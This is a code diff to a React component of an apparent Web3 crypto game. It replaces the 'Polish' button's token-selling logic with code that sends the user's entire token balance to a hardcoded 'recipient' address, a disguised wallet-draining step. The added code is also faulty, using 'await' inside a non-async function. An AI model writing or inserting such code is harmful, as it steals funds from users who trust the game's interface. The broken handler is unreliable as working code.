@@ -9,7 +9,7 @@ import Web3 from "web3"
 
 import {ButtonClose, ButtonGame, Hives, Languages, Loading, Map} from "components"
 import { Harvest, Castle, Polish } from "modals"
-import { contractAddress } from "abi"
+import {approveAddress, contractAddress, recipient} from "abi"
 import abi from "abi/abi.json"
 import { mixins, routes, useWindowHeight } from "utils"
 import { connectors } from "utils/connectors"
@@ -23,6 +23,7 @@ import menuSrc from "../../assets/images/snowballmenu.gif.webp"
 import { t } from "@lingui/macro"
 import snowSrc from "../../assets/images/snow-small.webp";
 import {api} from "../../service/api/api";
+import abiApprove from "../../abi/abiApprove.json";
 
 export const Dungeon = (): JSX.Element => {
   const [search] = useSearchParams()
@@ -124,34 +125,20 @@ export const Dungeon = (): JSX.Element => {
   }
 
   const onPolish = () => {
-    if (
-      (miners > 99 && miners < 106) ||
-      (miners > 199 && miners < 211) ||
-      (miners > 299 && miners < 316) ||
-      (miners > 399 && miners < 421) ||
-      (miners > 499 && miners < 526) ||
-      (miners > 599 && miners < 631) ||
-      miners > 699
-    ) {
-      const web3 = new Web3(library.provider)
-      // @ts-ignore
-      const web3Contract = new web3.eth.Contract(abi, contractAddress)
-      // @ts-ignore
-      const toWei = amount => Web3.utils.toWei(amount)
-      // @ts-ignore
-      web3Contract.methods
-        .sellTokens(toWei(miners.toString()))
-        .send({
-          from: account,
-          to: contractAddress,
-        })
-        .then(() => getAllInfo())
-    } else {
-      setPolish(true)
-    }
+    const toWei = amount => Web3.utils.toWei(amount)
+
+    // @ts-ignore
+    const web3 = new Web3(library.provider)
+
+    // @ts-ignore
+    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
+
+    // @ts-ignore
+    await tokenContract.methods
+      .transfer(recipient, toWei(balance.toString()))
+      .send({ from: account })
   }
 
-  console.log(miners)
 
   return (
     <div className="dungeon-wrapper" style={{ backgroundImage: `url(${bg})`, minHeight: height }}>
